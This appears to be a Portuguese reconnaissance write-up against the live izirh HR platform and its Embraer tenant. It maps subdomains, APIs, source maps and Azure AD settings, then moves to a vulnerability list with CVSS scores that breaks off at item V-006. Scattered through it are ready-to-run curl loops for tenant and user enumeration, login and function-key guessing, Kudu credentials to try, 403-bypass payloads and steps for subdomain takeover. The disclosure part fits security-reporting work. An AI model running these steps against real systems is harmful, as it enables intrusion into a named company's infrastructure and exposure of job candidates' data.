# izirh / Embraer — Recon Document

> Gerado em: 2026-06-22
> Alvo: Embraer (embraer.izirh.io) via plataforma izirh

---

## SUMARIO

1. [Subdominios e Infraestrutura](#1-subdominios)
2. [Blob Storage e Bundles](#2-blob-storage)
3. [API Surface v1 (Gateway)](#3-api-v1)
4. [API Surface v2](#4-api-v2)
5. [Tenant Enumeration](#5-tenant-enumeration)
6. [Autenticacao (Admin Login)](#6-autenticacao)
7. [Autenticacao (Candidate Login)](#7-candidate-login)
8. [Sistema de IA (iziia)](#8-ia)
9. [Azure AD](#9-azure-ad)
10. [Subdomain Takeover](#10-subdomain-takeover)
11. [403 Bypass (vagas.izirh.io)](#11-403-bypass)
12. [Kudu/SCM](#12-kudu)
13. [Arquitetura Micro-Frontends](#13-mfe)
14. [CSP e Headers](#14-csp)
15. [Vulnerabilidades - CERT/CTIR](#15-vulnerabilidades)
16. [Proximos Passos](#16-proximos-passos)

---

## 1. SUBDOMINIOS

### Descobertos via DNS

```
izirh.io                      (Site principal / shell single-spa)
www.izirh.io                  -> cdn.webflow.com (404 - Webflow)
vagas.izirh.io                (Next.js - Portal de Vagas)
sertec.izirh.io               (Tenant Sertec - mesmo shell)
embraer.izirh.io              (Tenant Embraer - CONFIRMADO!)
izi-api.izirh.io              (API v1 - Azure App Gateway)
izi-api-v2.izirh.io           (API v2 - Express/REST)
izi-ds-functions-prod.izirh.io (Azure Functions - prod)
api-dev.izirh.io              (Dev API -> App Gateway)
api-uat.izirh.io              (UAT -> CNAME: izi-uat.azurewebsites.net !!)
api-sit.izirh.io              (SIT -> CNAME: izi-sit.azurewebsites.net !!)
qa.izirh.io                   (QA -> CNAME: agreeable-meadow-09858d50f.azurestaticapps.net !!)
dev.izirh.io                  (-> App Gateway)
uat.izirh.io                  (-> App Gateway)
sit.izirh.io                  (-> App Gateway)
autodiscover.izirh.io         (-> Outlook)
lyncdiscover.izirh.io         (-> Lync)
sip.izirh.io                  (-> Lync)
```

### Rotas do Shell (single-spa)

Via import map, os MFEs sao carregados em:

```
/recrutamento-admin           @izi/mfe-recruitment-admin
/admissoes-admin              @izi/mfe-admissions-admin
/recrutamento                 @izi/mfe-recruitment
/admissoes                    @izi/mfe-admissions
/admin-login                  @izi/mfe-admin-login
/candidate-login              @izi/mfe-candidate-login
/account                      @izi/mfe-account
/dashboards                   @izi/mfe-dashboards
/crawler-data                 @izi/mfe-crawler-data
/fit-cultural                 @izi/mfe-fit-cultural
/ia                           @izi/mfe-iziia
/relatorios-admin             @izi/mfe-monitoring-center
/recrutamento-v2              @izi/mfe-job-board
/api                          @izi/mfe-api-docs
```

### Subdominios PCD (do source)

```
vagas-pcd-dev
vagas-pcd-uat
gruponcdiversidade
conectadiversidade
localhost:3000
```

### Como testar:

```bash
dig +short <sub>.izirh.io A
dig +short <sub>.izirh.io CNAME
curl -sI "https://<sub>.izirh.io" 2>&1 | head -10
```

---

## 2. BLOB STORAGE

### URL Base
```
https://izishared.blob.core.windows.net/mfes/
```

### Import Map (PROD)
```
https://izishared.blob.core.windows.net/mfes/import-maps/prod-import-map.json
```

### Todos os Bundles (18 MFEs)

| MFE | URL |
|---|---|
| admissions-admin | `.../admissions-admin/prod/build-430346/izi-mfe-admissions-admin.js` |
| admissions | `.../admissions/build-458178/izi-mfe-admissions.js` |
| recruitment | `.../recruitment/prod/build-440337/izi-mfe-recruitment.js` |
| recruitment-admin | `.../recruitment-admin/prod/build-462178/izi-mfe-recruitment-admin.js` |
| root | `.../root/prod/build-440200/izi-mfe-root.js` |
| landing-page | `.../landing-page/build-455874/izi-mfe-landing-page.js` |
| feature-toggles | `.../feature-toggles/build-326260/izi-mfe-feature-toggles.js` |
| crawler-data | `.../crawler-data/build-162696/izi-mfe-crawler-data.js` |
| admin-login | `.../admin-login/build-440222/izi-mfe-admin-login.js` |
| candidate-login | `.../candidate-login/build-447956/izi-mfe-candidate-login.js` |
| dashboards | `.../dashboards/prod/build-348382/izi-mfe-dashboards.js` |
| account | `.../account/build-273101/izi-mfe-account.js` |
| recruitment-admin-v2 | `.../recruitment-admin-v2/build-460767/izi-mfe-recruitment-admin-v2.js` |
| fit-cultural | `.../fit-cultural/build-348384/izi-mfe-fit-cultural.js` |
| monitoring-center | `.../monitoring-center/build-395977/izi-mfe-monitoring-center.js` |
| iziia (AI) | `.../iziia/build-348387/izi-mfe-iziia.js` |
| shared | `.../shared/build-397092/izi-mfe-shared.js` |
| job-board | `.../job-board/build-370659/izi-mfe-job-board.js` |

### Chunks do Admin-Login (analisados)

Base: `https://izishared.blob.core.windows.net/mfes/admin-login/build-440222/chunks/`

```
izi-mfe-admin-login-9bfb5434.js    (197KB - auth logic)
LoginPage-8f8ad005.js              (5KB - tela de login)
LoginEnterprisePage-a2dc2b6b.js    (2.5KB - SSO/enterprise login)
CallbackPage-ac5ef67a.js           (1.7KB - OAuth callback)
config-3da6abe1.js                 (constantes/commands)
getCaptchaToken-c3b2de19.js        (reCAPTCHA)
Header-b1db7005.js
admin-login-page-banner-26a4f9fd.js
DynamicForm-fb64ca78.js
Button-53c6e8bf.js
```

### Como baixar:

```bash
curl -sO "https://izishared.blob.core.windows.net/mfes/<mfe>/<build>/<file>.js"
```

### Testes de seguranca:

```
Container listing:  404 (bloqueado)
Write (PUT):        404 (bloqueado)
Source maps:        404 (nao existem)
```

---

## 3. API SURFACE — V1 (Gateway)

### URL Base
```
https://izi-api.izirh.io
```

### Server
```
Server: Microsoft-Azure-Application-Gateway/v2
```

### Microservicos (descobertos nos bundles)

```
/api/sertec-ms-access-management
/api/sertec-ms-auth                  -> comando-based auth
/api/sertec-ms-candidates
/api/sertec-ms-clients
/api/sertec-ms-email
/api/sertec-ms-profiles
/api/sertec-ms-roadmaps
/api/sertec-ms-templates-vacancy
/api/sertec-ms-vacancies
/api/sertec-ms-vacancies-funnel
/api/sertec-ms-workspaces
```

### Auth microservice (FUNCIONA)

```
POST /api/sertec-ms-auth
Content-Type: application/json

Body: {"command":"<command>","payload":{...}}
```

**Comandos validados:**

| Comando | Resposta sem payload valido |
|---|---|
| `email_password_login_admin` | `{"error":"INVALID_CAPTCHA"}` |
| `verify_token` | `{"error":"INVALID_TOKEN"}` |
| `refresh_admin_token` | `{"error":"INVALID_TOKEN"}` |
| `logout_admin_user` | (provavelmente OK) |
| `logout_candidate_user` | (provavelmente OK) |
| `entra_id_login_admin` | (Azure AD login) |
| Outros | `{"error":"INVALID_COMMAND::<cmd>"}` |

### CORS testado

```
sertec.izirh.io         -> Access-Control-Allow-Origin: https://sertec.izirh.io (com credentials)
izirh.io                -> NEGADO
vagas.izirh.io          -> NEGADO
*.izirh.io (outros)     -> NEGADO
```

### Como testar:

```bash
curl -s "https://izi-api.izirh.io/api/sertec-ms-auth" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"command":"email_password_login_admin","payload":{"email":"admin@sertec.com.br","password":"test","captchaToken":"x","companyId":"sertec"}}'
```

---

## 4. API SURFACE — V2

### URL Base
```
https://izi-api-v2.izirh.io
```

### Endpoints publicos (sem auth)

| Endpoint | Metodo | Resposta |
|---|---|---|
| `/api/health` | GET | 200 (sem conteudo) |
| `/api/configurations/get-client-configurations?origin=<tenant>` | GET | `{}` se tenant existe, `INTERNAL_ERROR` se nao |
| `/api/configurations/tenant-data?origin=<tenant>` | GET | `{}` (mesmo padrao) |
| `/api/auth/forgot-password` | POST | `INVALID_REQUEST` (requer `companyId`) |
| `/api/auth/idp/redirect` | POST | `INTERNAL_ERROR` |

### Azure Functions (izi-ds-functions-prod)

| Metodo | Path | Resposta | Observacao |
|--------|------|----------|------------|
| GET | `/` | 200 (pagina default) | Root exposto |
| POST | `/api/health` | 403 | Funcao existe (requer chave) |
| POST | `/api/login` | 403 | Funcao existe (requer chave) |
| POST | `/api/auth` | 403 | Funcao existe (requer chave) |
| POST | `/api/token` | 403 | Funcao existe (requer chave) |
| POST | `/api/candidate` | 403 | Funcao existe (requer chave) |
| POST | `/api/vacancy` | 403 | Funcao existe (requer chave) |
| POST | `/api/process` | 403 | Funcao existe (requer chave) |
| POST | `/api/sync` | 403 | Funcao existe (requer chave) |
| POST | `/api/webhook` | 403 | Funcao existe (requer chave) |
| POST | `/api/callback` | 403 | Funcao existe (requer chave) |
| POST | `/api/email` | 403 | Funcao existe (requer chave) |
| POST | `/api/export` | 403 | Funcao existe (requer chave) |

Todas retornam 403 (nao 404) confirmando que os endpoints existem mas requerem `x-functions-key`. 
Common keys testadas sem sucesso: `test`, `admin`, `dev`, `prod`, `master`, `default`, `secret`, `izirh`, `sertec`, `embraer`.

### Endpoints que requerem auth (retornam 401)

```
/api/candidates
/api/candidates/change-candidature-phase
/api/candidates/disapproved-applications
/api/subdomains
/api/v2/roles
/api/vacancies/candidatures
/api/notifications
/api/notifications/count
/api/notifications/status
/api/custom-fields
/api/integrations/coodesh/assessments
/api/integrations/coodesh/attempts
/api/integrations/mindsight/archetypes
/api/integrations/mindsight/assessments
/api/cultural-fit/ambassadors
/api/cultural-fit/ambassadors/invite
```

### Swagger/OpenAPI

```
/swagger             -> 404
/swagger/index.html  -> 404
/api-docs            -> 404
```

### Como testar:

```bash
# Testar se endpoint existe (401 = real, 404 = falso)
curl -s -o /dev/null -w "%{http_code}" "https://izi-api-v2.izirh.io/api/candidates" -H "Accept: application/json"

# Ler resposta de erro
curl -s "https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=sertec.izirh.io" -H "Accept: application/json"
```

---

## 5. TENANT ENUMERATION

### Endpoint Oracle
```
GET https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=<tenant>
```

**Logica de resposta:**
- `{}` (objeto vazio) = Tenant EXISTE
- `{"error":"INTERNAL_ERROR"}` = Tenant NAO existe ou invalido

### Tenants confirmados

```
sertec.izirh.io    -> {}  (CONFIRMADO)
embraer.izirh.io   -> {}  (CONFIRMADO - EMBRAER!)
```

### Como enumerar:

```bash
for origin in "sertec" "embraer" "accenture" "itau" "bradesco"; do
  result=$(curl -s "https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=$origin.izirh.io" -H "Accept: application/json")
  if echo "$result" | grep -q '^\{\}$'; then
    echo "LIVE-TENANT: $origin.izirh.io"
  fi
done
```

---

## 6. AUTENTICACAO — ADMIN LOGIN

### Comandos confirmados via source maps (codigo legivel)

```
email_password_login_admin   -> Login admin email/senha
entra_id_login_admin         -> Azure AD / Entra ID SSO
verify_token                 -> Verificar token JWT
refresh_admin_token          -> Refresh token (cookie "refreshToken")
logout_admin_user            -> Logout admin
```

### Fluxo completo (reversado do bundle + source maps)

**1. Bootstrap:**
```
GET https://izi-api-v2.izirh.io/api/configurations/get-client-configurations?origin=<subdomain>
GET https://izi-api-v2.izirh.io/api/configurations/tenant-data?origin=<subdomain>
```

**2. Login Request:**
```
POST https://izi-api.izirh.io/api/sertec-ms-auth
Content-Type: application/json

{
  "command": "email_password_login_admin",
  "payload": {
    "companyId": "<tenant_uuid>",     // UUID do tenant (de clientDynamicData.tenantId)
    "email": "<email>",
    "password": "<senha>",
    "captchaToken": "<recaptcha_token>"   // Google reCAPTCHA
  }
}
```

**3. Resposta de sucesso:**
```json
{
  "token": "<jwt_token>",
  "modulesStringArray": ["<modulos_do_usuario>"],
  "result": "..."
}
```

**4. Armazenamento do token:**
```
localStorage.setItem("token", "<jwt_token>")
```

**5. Verify token (em cada reload):**
```
POST /api/sertec-ms-auth
Body: {"command":"verify_token","payload":{"token":"<jwt>"}}
```

**6. Login Social / SSO:**
```
POST https://izi-api-v2.izirh.io/api/auth/idp/redirect
Body: {"companyId": "<tenant_uuid>"}
Resposta: URL de redirect para IdP
```

### Turmas de erro (do bundle)

| Erro | Mensagem |
|---|---|
| `INVALID_TOKEN` | "Token fornecido para login nao e valido" |
| `INVALID_ROLE` | "Voce nao tem permissao para realizar esta acao" |
| `USER_ALREADY_EXISTS` | (cadastro duplicado) |
| `INVALID_COMMAND::<cmd>` | Comando desconhecido |
| `INVALID_CAPTCHA` | Captcha invalido/expirado |

### Constantes do config module

```
LOGIN: "email_password_login_admin"
LOGIN_ENTRA_ID: "entra_id_login_admin"
```

### Tokens no localStorage

```
Admin:    "token"  + "refreshToken" (cookie)
Candidato: "candidateToken" + "refreshCandidateToken" (cookie)
Social Login: "LOGIN_TYPE" (guarda o tipo de login)
```

---

## 7. CANDIDATE LOGIN

### Comandos confirmados via source maps (codigo legivel do recruitment MFE)

```
email_password_login          -> Login candidato email/senha
google_login                  -> Google SSO (com accessToken do Google)
linkedin_login                -> LinkedIn SSO (com verificationToken)
register_user                 -> Criar conta candidato
forgot_password               -> Esqueci senha
recover_password              -> Recuperar senha
verify-cpf-existence          -> Verificar CPF
fetch-email-by-cpf            -> Buscar email por CPF
send-email-confirmation       -> Enviar confirmacao de email
set-email-confirmation        -> Confirmar email
create-short-candidature      -> Candidatura rapida
accept-terms                  -> Aceitar termos
get-terms-of-use              -> Obter termos de uso
fetch-areas-of-interest       -> Areas de interesse
fetch-inscriptions            -> Inscricoes do candidato
```

### Fluxo Google OAuth (com client_secret hardcoded)

O callback page (`src/pages/auth/callback/google.js`) contem **client_secret hardcoded**:

```javascript
client_id: "[REDACTED].apps.googleusercontent.com"
client_secret: "[REDACTED]"   // <-- HARCODED
redirect_uri: `${window.location.origin}/auth/callback/google`
grant_type: 'authorization_code'
```

O fluxo: Google redirect -> callback page troca code por token -> envia `id_token` para API com comando `google_login`.

**Nota:** A env var `GOOGLE_CLIENT_ID` (usada para iniciar o OAuth) e DIFERENTE do client_id hardcoded no callback. Possivelmente dois projetos Google diferentes.

### Fluxo LinkedIn OAuth

```
command: "linkedin_login"
payload: {
  verificationToken: "<codigo_autorizacao_linkedin>",
  linkedinAcessToken: "<token>",
  companyId: localStorage.getItem("connectionPool"),
  redirectUrlLinkedin: getMFEEnvVar("LINKEDIN_LOGIN_URI_REDIRECT")
}
```

LinkedIn OAuth confirmado funcional:
- `client_id`: `77m11b9x7s2wm4` (valido - LinkedIn aceita)
- `redirect_uri`: `https://sertec.izirh.io/linkedinLoginRedirect` (registrado)
- App ID LinkedIn: `203948884` (descoberto na URL de redirect)
- **Endpoint retorna 503** - backend do callback esta quebrado

### Facebook App ID

Confirmado valido via Graph API:
```json
{"category":"Business","link":"http://izirh.io/","name":"izi","id":"1238676580061472"}
```

### Fluxo de Token

```
Admin:      localStorage "token" + cookie "refreshToken" + comando "refresh_admin_token"
Candidato:  localStorage "candidateToken" + cookie "refreshCandidateToken" + comando "refresh_candidate_token"
```

O token e armazenado via `addTokenAsCookie()` e lido via `getToken()` = `localStorage.getItem("token")`.

### Loader (thin)
```
https://izishared.blob.core.windows.net/mfes/candidate-login/build-447956/izi-mfe-candidate-login.js
```

### Chunk real
```
https://izishared.blob.core.windows.net/mfes/candidate-login/build-447956/assets/izi-mfe-candidate-login-e84cfe89.js
```
(Apenas 215 bytes - chunk real pode ser outro caminho)

### Fluxo candidato (do bundle admin, settings):
```
localstorageTokenPath: "candidateToken"
refreshCookieName: "refreshCandidateToken"
refreshCommand: "refresh_candidate_token"
logoutCommand: "logout_candidate_user"
```

---

## 8. SISTEMA DE IA (iziia)

### MFE
```
@izi/mfe-iziia
Rota: /ia
```

### Bundle real
```
https://izishared.blob.core.windows.net/mfes/iziia/build-348387/assets/izi-mfe-iziia-fbb78b6c.js
```
**Tamanho: 763KB** (app completo com React, MSAL, router)

### Tecnologias identificadas

| Tecnologia | Detalhe |
|---|---|
| React | UI |
| React Router | Rotas internas |
| React Query | Cache/API |
| MSAL (Microsoft Auth Library) | Autenticacao Azure AD |
| Lodash | Utilitarios |
| Emotion | CSS-in-JS |
| Chakra UI | Componentes |

### Azure AD Integration

```
Tenant ID: 78481405-a361-415a-b544-49e3018b711d
Authority: https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d
Graph API: https://graph.microsoft.com/v1.0/me
           https://graph.microsoft.com/v1.0/me/photo/$value
```

### IMDS Endpoint (auto-detection de regiao Azure)
```
http://169.254.169.254/metadata/instance/compute/location
```

### Dev URL
```
http://localhost:3005/ia
```

### Azure AD Config (do bundle MSAL)

Endpoints OAuth2:
```
/oauth2/v2.0/authorize
/oauth2/v2.0/token
/oauth2/v2.0/logout
/discovery/v2.0/keys
```

---

## 9. AZURE AD

### Tenant Information

| Propriedade | Valor |
|---|---|
| **Tenant ID** | `78481405-a361-415a-b544-49e3018b711d` |
| **Regiao** | `SA` (South America - Brasil) |
| **Cloud** | `microsoftonline.com` |
| **Issuer** | `https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/v2.0` |

### Endpoints do Tenant

```
OpenID Config:
  https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/v2.0/.well-known/openid-configuration

Token:
  https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/token

Authorize:
  https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/authorize

Keys (JWKS):
  https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/discovery/v2.0/keys

Logout:
  https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/logout

Device Code:
  https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/devicecode

### Device Code Flow (CONFIRMADO FUNCIONAL)

Client ID valido: `7abe0925-40c8-48e8-9904-e7441dd4686c` (descoberto no bundle iziia)

```bash
curl -s -X POST "https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/devicecode" \
  -d "client_id=7abe0925-40c8-48e8-9904-e7441dd4686c&scope=openid%20profile%20email%20User.Read%20offline_access"
```

**Resposta:** 
```json
{"user_code":"BY3PXY2BJ","verification_uri":"https://login.microsoft.com/device","expires_in":900,"interval":5}
```

Outros client IDs encontrados (mas nao autorizados no tenant LEVVA):
- `9188040d-6c67-4c5b-b112-36a304b66dad` (Microsoft MSA - consumer)
- `53ee284d-920a-4b59-9d30-a60315b26836` (nao encontrado)

Kerberos:
  https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/kerberos
```

### mTLS
```
Token endpoint (mTLS):
  https://mtlsauth.microsoft.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/token
```

### Como enumerar usuarios (via login.microsoft.com):
```bash
# Tentar login com email conhecido (pode vazar existencia)
curl -s "https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/authorize?response_type=code&client_id=<client_id>&redirect_uri=<uri>&scope=user.read&state=test"

# Tentar device code flow (pode ser menos protegido)
curl -s "https://login.microsoftonline.com/78481405-a361-415a-b544-49e3018b711d/oauth2/v2.0/devicecode" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "client_id=<client_id>&scope=user.read"
```

---

## 10. SUBDOMAIN TAKEOVER

### CNAMEs dangling confirmados

| Subdominio | CNAME Target | Status Target | Severidade |
|---|---|---|---|
| `api-uat.izirh.io` | `izi-uat.azurewebsites.net` | **NXDOMAIN** (deleted) | CRITICO |
| `api-sit.izirh.io` | `izi-sit.azurewebsites.net` | **NXDOMAIN** (deleted) | CRITICO |
| `qa.izirh.io` | `agreeable-meadow-09858d50f.azurestaticapps.net` | **Azure 404** (app deleted) | ALTO |
| `www.izirh.io` | `cdn.webflow.com` | **Webflow 404** | MEDIO (se site nao reivindicado) |

### Impacto do takeover
- Controle total de um subdominio `*.izirh.io`
- Cookies scoped to `.izirh.io` seriam enviados para o atacante
- CORS confia em `sertec.izirh.io` (mesmo nivel de trust)
- CSP permite `*.izirh.io` em todos os directives
- Possivel bypass de OAuth redirect URI

### Como testar takeover:
```bash
# Verificar se o nome do App Service esta disponivel
# (requer conta Azure)
az webapp list --query "[?name=='izi-uat']"
# Se nao existir, tentar criar:
# az webapp create --name izi-uat --resource-group <group> --plan <plan>
```

---

## 11. 403 BYPASS (vagas.izirh.io)

### Arquivos que existem (retornam 403 vs 404)

```
403 /.env                -> EXISTE
403 /.env.production     -> EXISTE  
403 /.env.development    -> EXISTE
403 /.env.staging        -> EXISTE
403 /package.json        -> EXISTE
403 /yarn.lock           -> EXISTE
403 /package-lock.json   -> EXISTE
403 /Dockerfile          -> EXISTE
403 /Dockerfile.prod     -> EXISTE
403 /nginx.conf          -> EXISTE
403 /tsconfig.json       -> EXISTE
403 /webpack.config.js   -> EXISTE
403 /.eslintrc.json      -> EXISTE
404 /etc/passwd          -> NAO EXISTE
404 /config.json         -> NAO EXISTE
```

### Bypass techniques testadas (TODAS falharam)

```
URL case:                    /.Env                   -> 403
Path traversal:              /static/../.env        -> 403
Double encoding:             /%2e%6e%76/.env        -> 403
Null byte:                   /.env%00               -> 400
Suffix:                      /.env.                  -> 403
X-Original-URL:              /.env                   -> 403
X-Rewrite-URL:               /.env                   -> 403
X-Azure-FDID:                test                    -> 403
X-Custom-IP-Authorization:   127.0.0.1              -> 403
```

### Proximo: Tentar bypass via WebSocket, HTTP/2 padding, ou chunked encoding tricks

---

## 12. KUDU / SCM

### URL
```
https://izi-mfe-root.scm.azurewebsites.net
```

### Status
```
Acessivel: SIM (401 Unauthorized)
Autenticacao: Basic Auth
```

### Endpoints internos (requerem credenciais)

```
/                             -> Kudu dashboard
/Env                          -> Environment variables
/api/settings                 -> App settings
/api/diagnostics              -> Diagnostic tools
/api/vfs                      -> Virtual File System
/api/command                  -> Command execution
/detectors                    -> Diagnostic resources (LEAKED via error page)
```

### Como o endpoint foi descoberto
O Application Error page no endpoint:
```
https://sertec.izirh.io/auth/callback
```
revelou:
```
https://izi-mfe-root.scm.azurewebsites.net/detectors
```

### Credenciais para tentar
```
Padrao Azure: $<app-name> / <publishing-password>
              (ex: $izi-mfe-root / <senha_publicacao>)
```

---

## 13. ARQUITETURA MICRO-FRONTENDS

### Stack
```
Single-SPA (orquestrador)
SystemJS (module loader)
Import Maps (resolucao de modulos)
React 18
Chakra UI
```

### Fluxo de carregamento
```
1. index.html (shell)
   -> Carrega SystemJS + Import Maps
   -> Carrega @izi/mfe-shared (feature toggles, AB tests)
   -> Carrega @izi/mfe-root (router principal)
   -> Router decide qual MFE carregar baseado na rota

2. Cada MFE e um bundle JS separado no Azure Blob Storage
   -> System.import("@izi/mfe-<nome>")
   -> Single-spa baixa o bundle do blob

3. Cada MFE exporta { bootstrap, mount, unmount }
```

### Source Maps (disponiveis no blob storage)

Source maps com codigo TypeScript legivel encontrados nos buckets de build:

| Bundle | Path | Tamanho |
|--------|------|---------|
| root | `root/prod/build-440200/izi-mfe-root.js.map` | 46KB |
| admissions-admin | `admissions-admin/prod/build-430346/izi-mfe-admissions-admin.js.map` | 7.5MB (816 arquivos) |
| recruitment | `recruitment/prod/build-440337/izi-mfe-recruitment.js.map` | 5.9MB |
| shared | `shared/build-397092/izi-mfe-shared.js.map` | 22KB |
| feature-toggles | `feature-toggles/build-326260/izi-mfe-feature-toggles.js.map` | 16KB |

A analise dos source maps revelou codigo fonte legivel com todas as chamadas de API, fluxos de auth, e a configuracao completa dos MFEs.

### Feature Toggles (confirmados via source maps)

Do `@izi/mfe-shared` source maps (`src/FTs/`):

```javascript
// admissionsAdminFTs
admissionAdminDocumentWaitingDeliveryCard: { dev: true, sit: true, uat: false, prod: false }

// recruitmentAdminFTs
recruitmentAdminApprovalFlow: { dev: true, sit: false, uat: false, prod: false }
```

Toggle `recruitmentAdminApprovalFlow` esta DESLIGADO em producao — existe codigo para um fluxo de aprovacao que nunca roda em prod.

### import-map-overrides

A biblioteca `import-map-overrides@2.2.0` esta carregada em producao em todas as paginas do shell. Permite sobrescrever qualquer MFE module URL em runtime via `localStorage` ou console do browser:

```html
<script src="https://cdn.jsdelivr.net/npm/import-map-overrides@2.2.0/dist/import-map-overrides.js" nonce="..."></script>
<meta name="import-map-overrides-domains" content="denylist:prod.*">
```

A configuracao `denylist:prod.*` tenta bloquear ambientes de producao, mas pode ser contornavel dependendo da versao.

**Impacto:** Um atacante com acesso ao console do browser (via XSS, extensao maliciosa, ou dispositivo fisico) pode redirecionar qualquer MFE para um servidor controlado, executando codigo arbitrario no contexto do dominio.

### Env Vars (expostas no HTML)

```javascript
BACKEND_URI: "https://izi-api.izirh.io"
API_URI: "https://izi-api.izirh.io"
API_V2_URI: "https://izi-api-v2.izirh.io"
BACKEND_DS_URI: "https://izi-ds-functions-prod.izirh.io"
GOOGLE_CLIENT_ID: "[REDACTED].apps.googleusercontent.com"
FACEBOOK_APP_ID: "1238676580061472"
LINKEDIN_CLIENT_ID: "77m11b9x7s2wm4"
LINKEDIN_LOGIN_URI_REDIRECT: "https://sertec.izirh.io/linkedinLoginRedirect"
CAPTCHA_SITE_KEY: "6LcU5ZcsAAAAAH3Qe_ctvYMpkge1bEwipqqTZXSZ"
GTM_ID: "GTM-TVFBBQNL"
GA_TRACKING_ID: "G-NHL2DXDQDG"
GA_TRACKING_ID_RECRUITMENT_ADMIN: "G-RNR3SS153Z"
GA_TRACKING_ID_ADMISSIONS_ADMIN: "G-BW2T7HJWB2"
GA_TRACKING_ID_RECRUITMENT_CANDIDATE: "G-LXHZVZ05J7"
GA_TRACKING_ID_ADMISSIONS_CANDIDATE: "G-TNVZG7QJLN"
```

---

## 14. CSP E HEADERS

### sertec.izirh.io / izirh.io
```
script-src:   'unsafe-eval' + nonces + whitelist enorme
style-src:    'unsafe-inline' + fonts.googleapis.com
connect-src:  blob: data: + varios *.izirh.io + *.azurefd.net + etc
frame-src:    *.izirh.io + *.facebook.com + etc
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Cross-Origin-Opener-Policy: same-origin-allow-popups
```

### vagas.izirh.io (Next.js)
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### api-dev.izirh.io
```
Server: Microsoft-Azure-Application-Gateway/v2
```

### Notas
- `unsafe-eval` permite eval() e similares - XSS via script injection
- `unsafe-inline` permite style tags inline
- Whitelist enorme de domínios de terceiros aumenta superficie de ataque

---

## 15. VULNERABILIDADES — CERT/CTIR

### V-001: Subdomain Takeover (CRITICO)

**Descricao:** Tres subdominios de `*.izirh.io` apontam via CNAME para recursos Azure que nao existem mais. Um atacante pode reivindicar esses recursos e hospedar conteudo arbitrario no dominio legitimo.

**Evidencia:**
- `api-uat.izirh.io` -> `izi-uat.azurewebsites.net` (NXDOMAIN)
- `api-sit.izirh.io` -> `izi-sit.azurewebsites.net` (NXDOMAIN)
- `qa.izirh.io` -> `agreeable-meadow-09858d50f.azurestaticapps.net` (Azure 404)

**Impacto:**
- Controle total de subdominio `*.izirh.io`
- Roubo de cookies scoped para `.izirh.io`
- Bypass de CORS (gateway confia em `sertec.izirh.io`)
- Bypass de CSP (permite `*.izirh.io`)
- Possivel interceptacao de OAuth redirect URIs

**Remediacao:** Remover CNAMEs ou recriar os recursos Azure correspondentes.

**CVSS: 9.1 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)**

---

### V-002: Exposicao de Variaveis de Ambiente no HTML (ALTO)

**Descricao:** Todas as variaveis de ambiente de runtime (incluindo OAuth client IDs, URIs de backend, Google Analytics keys, GTM ID) sao inlineadas no HTML de cada pagina em um script tag acessivei a qualquer visitante.

**Evidencia:** `const envVars = { BACKEND_URI, API_URI, API_V2_URI, BACKEND_DS_URI, GOOGLE_CLIENT_ID, FACEBOOK_APP_ID, LINKEDIN_CLIENT_ID, LINKEDIN_LOGIN_URI_REDIRECT, CAPTCHA_SITE_KEY, GTM_ID, GA_TRACKING_IDS... }`

**Impacto:**
- Exposicao total da superficie de ataque de backend
- OAuth client IDs podem ser usados para phishing direcionado
- GA/GTM IDs permitem injecao de eventos falsos

**Remediacao:** Server-side rendering das env vars apenas quando necessario ou utilizar endpoints de configuracao autenticados.

**CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)**

---

### V-003: Google OAuth Client Secret Hardcoded no Frontend (ALTO)

**Descricao:** O arquivo `google.js` (callback page do recruitment MFE) contem o `client_secret` do Google OAuth hardcoded no codigo-fonte que e enviado para o navegador de cada candidato.

**Evidencia:**
```javascript
// src/pages/auth/callback/google.js
client_id: "[REDACTED].apps.googleusercontent.com"
client_secret: "[REDACTED]"
```

**Impacto:**
- Qualquer pessoa com acesso ao bundle JS pode trocar codigos de autorizacao Google por tokens
- Permite ataque de OAuth code interception se redirect URI for aberto
- Violacao direta das boas praticas do Google OAuth para aplicacoes web

**Remediacao:** Remover `client_secret` do frontend. Utilizar fluxo PKCE (Recomendacao Google para SPAs).

**CVSS: 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N)**

---

### V-004: Endpoint Kudu/SCM Exposto (MEDIO)

**Descricao:** O Application Error page (`sertec.izirh.io/auth/callback`) revela o endpoint Kudu/SCM (`izi-mfe-root.scm.azurewebsites.net`). Kudu e o console de administracao do Azure App Service.

**Evidencia:** Erro 503 em `/auth/callback` contem link para `https://izi-mfe-root.scm.azurewebsites.net/detectors`

**Impacto:** Se credenciais de deploy forem comprometidas, atacante ganha: VFS (arquivos), env vars, command execution, diagnostic tools.

**Remedicacao:** Desabilitar rota de error padrao do Azure App Service, nao expor links de diagnosticos.

**CVSS: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)**

---

### V-005: CSP com unsafe-eval e unsafe-inline (MEDIO)

**Descricao:** Content-Security-Policy permite `unsafe-eval` (scripts) e `unsafe-inline` (styles), aumentando superficie para XSS.

**Impacto:** XSS refletido ou armazenado pode ser explorado sem restricao de CSP.

**Remediacao:** Remover `unsafe-eval` e `unsafe-inline` da CSP. Utilizar nonces ou hashes.

**CVSS: 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)**

---

### V-006: import-map-overrides em Producao (MEDIO)

